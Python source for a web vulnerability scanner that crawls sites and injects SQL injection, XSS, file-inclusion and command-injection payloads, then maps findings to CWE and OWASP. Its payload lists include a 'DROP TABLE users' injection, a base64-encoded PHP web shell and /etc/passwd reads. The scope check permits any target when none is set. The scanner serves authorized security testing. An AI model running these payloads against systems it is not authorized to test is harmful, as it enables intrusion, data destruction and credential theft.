#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
    TSUNAMI WEB SCANNER v5.0
    Web Application Security Testing Module
================================================================================

    Features:
    - SQL injection detection
    - XSS detection
    - Directory traversal
    - CSRF checks
    - Authentication bypass attempts
    - API endpoint discovery
    - Parameter fuzzing

    IMPORTANT: For authorized testing only.
================================================================================
"""

import re
import json
import logging
import urllib.parse
import html
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from bs4 import BeautifulSoup

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class WebVulnType(Enum):
    """Web vulnerability types"""
    SQL_INJECTION = "sql_injection"
    SQL_INJECTION_BLIND = "sql_injection_blind"
    SQL_INJECTION_ERROR = "sql_injection_error"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    CSRF = "csrf"
    SSRF = "ssrf"
    OPEN_REDIRECT = "open_redirect"
    IDOR = "insecure_direct_object_reference"
    AUTH_BYPASS = "authentication_bypass"
    COMMAND_INJECTION = "command_injection"
    XXE = "xml_external_entity"
    SSTI = "server_side_template_injection"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    INFORMATION_DISCLOSURE = "information_disclosure"
    SENSITIVE_DATA_EXPOSURE = "sensitive_data_exposure"


class WebVulnSeverity(Enum):
    """Web vulnerability severity"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class WebVulnerability:
    """Web vulnerability finding"""
    id: str
    type: WebVulnType
    severity: WebVulnSeverity
    url: str
    parameter: str = ""
    method: str = "GET"
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    cwe_id: str = ""
    owasp_category: str = ""
    confidence: float = 0.0  # 0.0-1.0
    discovered_at: datetime = field(default_factory=datetime.now)
    request: str = ""
    response_excerpt: str = ""


@dataclass
class Endpoint:
    """API/Web endpoint"""
    url: str
    method: str
    parameters: List[str] = field(default_factory=list)
    headers: Dict[str, str] = field(default_factory=dict)
    content_type: str = ""
    requires_auth: bool = False
    discovered_from: str = ""


@dataclass
class ScanResult:
    """Web scan result"""
    target: str
    start_time: datetime = field(default_factory=datetime.now)
    end_time: Optional[datetime] = None
    vulnerabilities: List[WebVulnerability] = field(default_factory=list)
    endpoints: List[Endpoint] = field(default_factory=list)
    crawled_urls: Set[str] = field(default_factory=set)
    forms_found: int = 0
    parameters_tested: int = 0


class WebScanner:
    """
    Web Application Security Scanner

    Performs comprehensive web application security testing including:
    - SQL injection detection
    - Cross-site scripting (XSS) detection
    - Directory traversal / LFI / RFI
    - CSRF token validation
    - Authentication bypass testing
    - API endpoint discovery
    """

    # SQL Injection payloads
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1",
        "1' OR '1'='1",
        "admin'--",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1'; SELECT PG_SLEEP(5)--",
    ]

    # SQL error patterns
    SQLI_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"Unknown column",
        r"ORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"Microsoft SQL Server",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"Unclosed quotation mark",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"org\.postgresql\.jdbc",
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"sqlite3\.OperationalError",
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "<iframe src=\"javascript:alert('XSS')\">",
        "<marquee onstart=alert(1)>",
    ]

    # Directory traversal payloads
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    ]

    # LFI success patterns
    LFI_SUCCESS_PATTERNS = [
        r"root:.*:0:0:",  # Unix passwd
        r"\[extensions\]",  # Windows win.ini
        r"\[fonts\]",
        r"<\?php",
    ]

    # Command injection payloads
    CMDI_PAYLOADS = [
        "; ls -la",
        "| ls -la",
        "` ls -la `",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "| id",
        "& dir",
        "| type C:\\Windows\\win.ini",
    ]

    # Common directories to bruteforce
    COMMON_DIRS = [
        "admin", "administrator", "login", "wp-admin", "backup", "backups",
        "test", "testing", "dev", "development", "staging", "api", "v1", "v2",
        "config", "conf", "configuration", ".git", ".svn", ".htaccess",
        "phpmyadmin", "phpMyAdmin", "mysql", "database", "db", "sql",
        "uploads", "upload", "files", "images", "img", "media", "static",
        "assets", "css", "js", "scripts", "includes", "inc", "lib",
        "vendor", "node_modules", "tmp", "temp", "logs", "log", "cache",
        "private", "secret", "hidden", ".env", "env", "config.php",
        "wp-config.php", "settings.php", "credentials", "creds",
        "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
        ".well-known", "server-status", "server-info", "info.php", "phpinfo.php",
    ]

    # OWASP category mapping
    OWASP_MAPPING = {
        WebVulnType.SQL_INJECTION: "A03:2021-Injection",
        WebVulnType.SQL_INJECTION_BLIND: "A03:2021-Injection",
        WebVulnType.SQL_INJECTION_ERROR: "A03:2021-Injection",
        WebVulnType.XSS_REFLECTED: "A03:2021-Injection",
        WebVulnType.XSS_STORED: "A03:2021-Injection",
        WebVulnType.XSS_DOM: "A03:2021-Injection",
        WebVulnType.COMMAND_INJECTION: "A03:2021-Injection",
        WebVulnType.DIRECTORY_TRAVERSAL: "A01:2021-Broken Access Control",
        WebVulnType.LFI: "A01:2021-Broken Access Control",
        WebVulnType.RFI: "A01:2021-Broken Access Control",
        WebVulnType.IDOR: "A01:2021-Broken Access Control",
        WebVulnType.AUTH_BYPASS: "A07:2021-Identification and Authentication Failures",
        WebVulnType.CSRF: "A01:2021-Broken Access Control",
        WebVulnType.SSRF: "A10:2021-Server-Side Request Forgery",
        WebVulnType.XXE: "A05:2021-Security Misconfiguration",
        WebVulnType.INSECURE_DESERIALIZATION: "A08:2021-Software and Data Integrity Failures",
        WebVulnType.INFORMATION_DISCLOSURE: "A01:2021-Broken Access Control",
        WebVulnType.SENSITIVE_DATA_EXPOSURE: "A02:2021-Cryptographic Failures",
    }

    # CWE mapping
    CWE_MAPPING = {
        WebVulnType.SQL_INJECTION: "CWE-89",
        WebVulnType.SQL_INJECTION_BLIND: "CWE-89",
        WebVulnType.SQL_INJECTION_ERROR: "CWE-89",
        WebVulnType.XSS_REFLECTED: "CWE-79",
        WebVulnType.XSS_STORED: "CWE-79",
        WebVulnType.XSS_DOM: "CWE-79",
        WebVulnType.DIRECTORY_TRAVERSAL: "CWE-22",
        WebVulnType.LFI: "CWE-98",
        WebVulnType.RFI: "CWE-98",
        WebVulnType.CSRF: "CWE-352",
        WebVulnType.COMMAND_INJECTION: "CWE-78",
        WebVulnType.SSRF: "CWE-918",
        WebVulnType.XXE: "CWE-611",
        WebVulnType.AUTH_BYPASS: "CWE-287",
        WebVulnType.IDOR: "CWE-639",
    }

    def __init__(self, authorized_scope: List[str] = None):
        self._vuln_counter = 0
        self._session = requests.Session()
        self._session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self._authorized_scope = set(authorized_scope or [])
        self._results: Dict[str, ScanResult] = {}

    def _generate_vuln_id(self) -> str:
        """Generate unique vulnerability ID"""
        self._vuln_counter += 1
        return f"WEB-{self._vuln_counter:04d}"

    def _is_in_scope(self, url: str) -> bool:
        """Check if URL is in authorized scope"""
        if not self._authorized_scope:
            return True

        parsed = urllib.parse.urlparse(url)
        hostname = parsed.hostname or ""

        for scope in self._authorized_scope:
            if scope.startswith('*.'):
                domain = scope[2:]
                if hostname.endswith(domain) or hostname == domain:
                    return True
            elif hostname == scope or url.startswith(scope):
                return True

        return False

    def set_scope(self, targets: List[str]):
        """Set authorized scope"""
        self._authorized_scope = set(targets)

    def set_auth(self, auth_type: str, credentials: Dict[str, str]):
        """
        Set authentication for scanning

        Args:
            auth_type: 'basic', 'bearer', 'cookie', 'form'
            credentials: Authentication credentials
        """
        if auth_type == 'basic':
            self._session.auth = (credentials['username'], credentials['password'])
        elif auth_type == 'bearer':
            self._session.headers['Authorization'] = f"Bearer {credentials['token']}"
        elif auth_type == 'cookie':
            self._session.cookies.update(credentials)
        elif auth_type == 'form':
            # Perform login
            login_url = credentials.get('login_url', '')
            if login_url:
                self._session.post(login_url, data={
                    credentials.get('username_field', 'username'): credentials['username'],
                    credentials.get('password_field', 'password'): credentials['password']
                })

    def scan(self, target_url: str,
            scan_sqli: bool = True,
            scan_xss: bool = True,
            scan_lfi: bool = True,
            scan_csrf: bool = True,
            discover_endpoints: bool = True,
            max_depth: int = 3,
            max_urls: int = 100) -> ScanResult:
        """
        Perform comprehensive web security scan

        Args:
            target_url: Target URL to scan
            scan_sqli: Enable SQL injection testing
            scan_xss: Enable XSS testing
            scan_lfi: Enable LFI/directory traversal testing
            scan_csrf: Enable CSRF checking
            discover_endpoints: Enable endpoint discovery
            max_depth: Maximum crawl depth
            max_urls: Maximum URLs to scan

        Returns:
            ScanResult with all findings
        """
        if not self._is_in_scope(target_url):
            logger.error(f"[WEB-SCAN] Target not in scope: {target_url}")
            return ScanResult(target=target_url)

        logger.info(f"[WEB-SCAN] Starting scan: {target_url}")

        result = ScanResult(target=target_url)

        # Discover endpoints
        if discover_endpoints:
            endpoints = self._discover_endpoints(target_url, max_depth, max_urls)
            result.endpoints = endpoints
            result.crawled_urls = {e.url for e in endpoints}

        # Also test the main URL
        if target_url not in result.crawled_urls:
            result.crawled_urls.add(target_url)
            result.endpoints.append(Endpoint(url=target_url, method='GET'))

        # Extract forms and parameters
        forms_params = self._extract_forms_and_params(result.crawled_urls)
        result.forms_found = len(forms_params.get('forms', []))

        # Test each endpoint
        for endpoint in result.endpoints:
            params = self._get_url_params(endpoint.url)

            for param in params:
                result.parameters_tested += 1

                # SQL Injection
                if scan_sqli:
                    sqli_vulns = self._test_sqli(endpoint.url, param)
                    result.vulnerabilities.extend(sqli_vulns)

                # XSS
                if scan_xss:
                    xss_vulns = self._test_xss(endpoint.url, param)
                    result.vulnerabilities.extend(xss_vulns)

                # LFI / Directory Traversal
                if scan_lfi:
                    lfi_vulns = self._test_lfi(endpoint.url, param)
                    result.vulnerabilities.extend(lfi_vulns)

        # Test forms
        for form in forms_params.get('forms', []):
            if scan_sqli:
                result.vulnerabilities.extend(self._test_form_sqli(form))
            if scan_xss:
                result.vulnerabilities.extend(self._test_form_xss(form))
            if scan_csrf:
                csrf_vuln = self._check_csrf(form)
                if csrf_vuln:
                    result.vulnerabilities.append(csrf_vuln)

        # Directory bruteforce
        dir_vulns = self._bruteforce_directories(target_url)
        result.vulnerabilities.extend(dir_vulns)

        result.end_time = datetime.now()
        self._results[target_url] = result

        logger.info(f"[WEB-SCAN] Completed: {len(result.vulnerabilities)} vulnerabilities found")

        return result

    def _discover_endpoints(self, base_url: str,
                           max_depth: int,
                           max_urls: int) -> List[Endpoint]:
        """Discover endpoints by crawling"""
        endpoints = []
        visited = set()
        to_visit = [(base_url, 0)]

        while to_visit and len(visited) < max_urls:
            url, depth = to_visit.pop(0)

            if url in visited or depth > max_depth:
                continue

            if not self._is_in_scope(url):
                continue

            visited.add(url)

            try:
                response = self._session.get(url, timeout=10, verify=False)
                content_type = response.headers.get('Content-Type', '')

                endpoint = Endpoint(
                    url=url,
                    method='GET',
                    content_type=content_type
                )
                endpoints.append(endpoint)

                # Parse HTML for links
                if 'text/html' in content_type:
                    soup = BeautifulSoup(response.text, 'html.parser')

                    # Extract links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urllib.parse.urljoin(url, href)
                        parsed = urllib.parse.urlparse(full_url)
                        clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                        if clean_url not in visited:
                            to_visit.append((clean_url, depth + 1))

                    # Extract forms
                    for form in soup.find_all('form'):
                        action = form.get('action', '')
                        method = form.get('method', 'GET').upper()
                        form_url = urllib.parse.urljoin(url, action)

                        params = [inp.get('name') for inp in form.find_all('input')
                                 if inp.get('name')]

                        form_endpoint = Endpoint(
                            url=form_url,
                            method=method,
                            parameters=params,
                            discovered_from=url
                        )
                        endpoints.append(form_endpoint)

                    # Look for API endpoints in JavaScript
                    for script in soup.find_all('script'):
                        if script.string:
                            api_urls = re.findall(r'["\'](/api/[^"\']+)["\']', script.string)
                            for api_url in api_urls:
                                full_api = urllib.parse.urljoin(url, api_url)
                                endpoints.append(Endpoint(
                                    url=full_api,
                                    method='GET',
                                    discovered_from=url
                                ))

            except Exception as e:
                logger.debug(f"[WEB-SCAN] Error crawling {url}: {e}")

        return endpoints

    def _extract_forms_and_params(self, urls: Set[str]) -> Dict[str, Any]:
        """Extract forms and parameters from URLs"""
        forms = []
        params = []

        for url in urls:
            try:
                response = self._session.get(url, timeout=10, verify=False)
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    continue

                soup = BeautifulSoup(response.text, 'html.parser')

                for form in soup.find_all('form'):
                    form_data = {
                        'url': url,
                        'action': urllib.parse.urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }

                    for inp in form.find_all(['input', 'textarea', 'select']):
                        input_name = inp.get('name')
                        if input_name:
                            form_data['inputs'].append({
                                'name': input_name,
                                'type': inp.get('type', 'text'),
                                'value': inp.get('value', '')
                            })

                    forms.append(form_data)

            except Exception as e:
                logger.debug(f"[WEB-SCAN] Error extracting forms from {url}: {e}")

        return {'forms': forms, 'params': params}

    def _get_url_params(self, url: str) -> List[str]:
        """Extract parameters from URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return list(params.keys())

    def _test_sqli(self, url: str, param: str) -> List[WebVulnerability]:
        """Test for SQL injection"""
        vulnerabilities = []
        parsed = urllib.parse.urlparse(url)
        base_params = urllib.parse.parse_qs(parsed.query)

        for payload in self.SQLI_PAYLOADS[:10]:  # Limit payloads
            test_params = base_params.copy()
            test_params[param] = payload

            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

            try:
                response = self._session.get(test_url, timeout=10, verify=False)
                response_text = response.text

                # Check for error-based SQLi
                for pattern in self.SQLI_ERROR_PATTERNS:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        vuln = WebVulnerability(
                            id=self._generate_vuln_id(),
                            type=WebVulnType.SQL_INJECTION_ERROR,
                            severity=WebVulnSeverity.CRITICAL,
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=re.search(pattern, response_text, re.IGNORECASE).group()[:100],
                            description=f"Error-based SQL injection in parameter '{param}'",
                            remediation="Use parameterized queries or prepared statements",
                            cwe_id=self.CWE_MAPPING.get(WebVulnType.SQL_INJECTION, ""),
                            owasp_category=self.OWASP_MAPPING.get(WebVulnType.SQL_INJECTION, ""),
                            confidence=0.9,
                            response_excerpt=response_text[:500]
                        )
                        vulnerabilities.append(vuln)
                        logger.warning(f"[WEB-SCAN] SQLi found: {url} param={param}")
                        return vulnerabilities  # Found, no need to test more

            except Exception as e:
                logger.debug(f"[WEB-SCAN] SQLi test error: {e}")

        return vulnerabilities

    def _test_xss(self, url: str, param: str) -> List[WebVulnerability]:
        """Test for XSS"""
        vulnerabilities = []
        parsed = urllib.parse.urlparse(url)
        base_params = urllib.parse.parse_qs(parsed.query)

        for payload in self.XSS_PAYLOADS[:8]:  # Limit payloads
            test_params = base_params.copy()
            test_params[param] = payload

            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

            try:
                response = self._session.get(test_url, timeout=10, verify=False)

                # Check if payload is reflected
                if payload in response.text:
                    vuln = WebVulnerability(
                        id=self._generate_vuln_id(),
                        type=WebVulnType.XSS_REFLECTED,
                        severity=WebVulnSeverity.HIGH,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Payload reflected in response",
                        description=f"Reflected XSS in parameter '{param}'",
                        remediation="Encode output and implement Content Security Policy",
                        cwe_id=self.CWE_MAPPING.get(WebVulnType.XSS_REFLECTED, ""),
                        owasp_category=self.OWASP_MAPPING.get(WebVulnType.XSS_REFLECTED, ""),
                        confidence=0.85
                    )
                    vulnerabilities.append(vuln)
                    logger.warning(f"[WEB-SCAN] XSS found: {url} param={param}")
                    return vulnerabilities

            except Exception as e:
                logger.debug(f"[WEB-SCAN] XSS test error: {e}")

        return vulnerabilities

    def _test_lfi(self, url: str, param: str) -> List[WebVulnerability]:
        """Test for LFI/directory traversal"""
        vulnerabilities = []
        parsed = urllib.parse.urlparse(url)
        base_params = urllib.parse.parse_qs(parsed.query)

        for payload in self.LFI_PAYLOADS[:6]:
            test_params = base_params.copy()
            test_params[param] = payload

            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"

            try:
                response = self._session.get(test_url, timeout=10, verify=False)

                # Check for success indicators
                for pattern in self.LFI_SUCCESS_PATTERNS:
                    if re.search(pattern, response.text):
                        vuln = WebVulnerability(
                            id=self._generate_vuln_id(),
                            type=WebVulnType.LFI,
                            severity=WebVulnSeverity.CRITICAL,
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=re.search(pattern, response.text).group()[:100],
                            description=f"Local File Inclusion in parameter '{param}'",
                            remediation="Validate and sanitize file paths, use allowlists",
                            cwe_id=self.CWE_MAPPING.get(WebVulnType.LFI, ""),
                            owasp_category=self.OWASP_MAPPING.get(WebVulnType.LFI, ""),
                            confidence=0.95
                        )
                        vulnerabilities.append(vuln)
                        logger.warning(f"[WEB-SCAN] LFI found: {url} param={param}")
                        return vulnerabilities

            except Exception as e:
                logger.debug(f"[WEB-SCAN] LFI test error: {e}")

        return vulnerabilities

    def _test_form_sqli(self, form: Dict) -> List[WebVulnerability]:
        """Test form for SQL injection"""
        vulnerabilities = []

        for input_data in form.get('inputs', []):
            if input_data.get('type') in ['hidden', 'submit']:
                continue

            param_name = input_data.get('name')
            if not param_name:
                continue

            for payload in self.SQLI_PAYLOADS[:5]:
                data = {inp['name']: inp.get('value', 'test')
                       for inp in form.get('inputs', [])}
                data[param_name] = payload

                try:
                    if form.get('method', 'GET').upper() == 'POST':
                        response = self._session.post(
                            form['action'], data=data, timeout=10, verify=False)
                    else:
                        response = self._session.get(
                            form['action'], params=data, timeout=10, verify=False)

                    for pattern in self.SQLI_ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vuln = WebVulnerability(
                                id=self._generate_vuln_id(),
                                type=WebVulnType.SQL_INJECTION_ERROR,
                                severity=WebVulnSeverity.CRITICAL,
                                url=form['action'],
                                parameter=param_name,
                                method=form.get('method', 'GET').upper(),
                                payload=payload,
                                evidence=re.search(pattern, response.text, re.IGNORECASE).group()[:100],
                                description=f"SQL injection in form field '{param_name}'",
                                remediation="Use parameterized queries",
                                cwe_id=self.CWE_MAPPING.get(WebVulnType.SQL_INJECTION, ""),
                                owasp_category=self.OWASP_MAPPING.get(WebVulnType.SQL_INJECTION, ""),
                                confidence=0.9
                            )
                            vulnerabilities.append(vuln)
                            return vulnerabilities

                except Exception as e:
                    logger.debug(f"[WEB-SCAN] Form SQLi test error: {e}")

        return vulnerabilities

    def _test_form_xss(self, form: Dict) -> List[WebVulnerability]:
        """Test form for XSS"""
        vulnerabilities = []

        for input_data in form.get('inputs', []):
            if input_data.get('type') in ['hidden', 'submit', 'password']:
                continue

            param_name = input_data.get('name')
            if not param_name:
                continue

            for payload in self.XSS_PAYLOADS[:5]:
                data = {inp['name']: inp.get('value', 'test')
                       for inp in form.get('inputs', [])}
                data[param_name] = payload

                try:
                    if form.get('method', 'GET').upper() == 'POST':
                        response = self._session.post(
                            form['action'], data=data, timeout=10, verify=False)
                    else:
                        response = self._session.get(
                            form['action'], params=data, timeout=10, verify=False)

                    if payload in response.text:
                        vuln = WebVulnerability(
                            id=self._generate_vuln_id(),
                            type=WebVulnType.XSS_REFLECTED,
                            severity=WebVulnSeverity.HIGH,
                            url=form['action'],
                            parameter=param_name,
                            method=form.get('method', 'GET').upper(),
                            payload=payload,
                            description=f"XSS in form field '{param_name}'",
                            remediation="Encode output properly",
                            cwe_id=self.CWE_MAPPING.get(WebVulnType.XSS_REFLECTED, ""),
                            owasp_category=self.OWASP_MAPPING.get(WebVulnType.XSS_REFLECTED, ""),
                            confidence=0.85
                        )
                        vulnerabilities.append(vuln)
                        return vulnerabilities

                except Exception as e:
                    logger.debug(f"[WEB-SCAN] Form XSS test error: {e}")

        return vulnerabilities

    def _check_csrf(self, form: Dict) -> Optional[WebVulnerability]:
        """Check form for CSRF protection"""
        inputs = form.get('inputs', [])
        input_names = [inp.get('name', '').lower() for inp in inputs]

        # Look for CSRF tokens
        csrf_indicators = ['csrf', 'token', '_token', 'authenticity_token', 'nonce']
        has_csrf = any(indicator in name for name in input_names
                      for indicator in csrf_indicators)

        if not has_csrf and form.get('method', '').upper() == 'POST':
            return WebVulnerability(
                id=self._generate_vuln_id(),
                type=WebVulnType.CSRF,
                severity=WebVulnSeverity.MEDIUM,
                url=form['action'],
                method='POST',
                description="Form lacks CSRF token protection",
                remediation="Implement anti-CSRF tokens",
                cwe_id=self.CWE_MAPPING.get(WebVulnType.CSRF, ""),
                owasp_category=self.OWASP_MAPPING.get(WebVulnType.CSRF, ""),
                confidence=0.7
            )

        return None

    def _bruteforce_directories(self, base_url: str) -> List[WebVulnerability]:
        """Bruteforce common directories"""
        vulnerabilities = []
        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        def check_dir(directory: str) -> Optional[WebVulnerability]:
            url = f"{base}/{directory}"
            try:
                response = self._session.get(url, timeout=5, verify=False,
                                            allow_redirects=False)
                if response.status_code in [200, 403]:
                    # Check for sensitive files
                    if directory in ['.git', '.svn', '.env', 'wp-config.php']:
                        return WebVulnerability(
                            id=self._generate_vuln_id(),
                            type=WebVulnType.SENSITIVE_DATA_EXPOSURE,
                            severity=WebVulnSeverity.HIGH,
                            url=url,
                            description=f"Sensitive file/directory exposed: {directory}",
                            remediation="Restrict access to sensitive files",
                            cwe_id="CWE-538",
                            owasp_category="A01:2021-Broken Access Control",
                            confidence=0.9
                        )
                    elif response.status_code == 200:
                        return WebVulnerability(
                            id=self._generate_vuln_id(),
                            type=WebVulnType.INFORMATION_DISCLOSURE,
                            severity=WebVulnSeverity.LOW,
                            url=url,
                            description=f"Directory listing or accessible path: {directory}",
                            remediation="Review access controls",
                            cwe_id="CWE-548",
                            owasp_category="A01:2021-Broken Access Control",
                            confidence=0.6
                        )
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_dir, d): d for d in self.COMMON_DIRS}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)

        return vulnerabilities

    def get_results(self, target: str = None) -> Dict[str, ScanResult]:
        """Get scan results"""
        if target:
            return {target: self._results.get(target)}
        return dict(self._results)

    def export_results(self, target: str, format: str = 'json') -> str:
        """Export scan results"""
        result = self._results.get(target)
        if not result:
            return "{}"

        if format == 'json':
            return json.dumps({
                'target': result.target,
                'start_time': result.start_time.isoformat(),
                'end_time': result.end_time.isoformat() if result.end_time else None,
                'vulnerabilities': [asdict(v) for v in result.vulnerabilities],
                'endpoints': [asdict(e) for e in result.endpoints],
                'crawled_urls': list(result.crawled_urls),
                'forms_found': result.forms_found,
                'parameters_tested': result.parameters_tested
            }, indent=2, default=str)

        raise ValueError(f"Unsupported format: {format}")


# Singleton instance
_web_scanner: Optional[WebScanner] = None

def get_web_scanner() -> WebScanner:
    """Get singleton WebScanner instance"""
    global _web_scanner
    if _web_scanner is None:
        _web_scanner = WebScanner()
    return _web_scanner
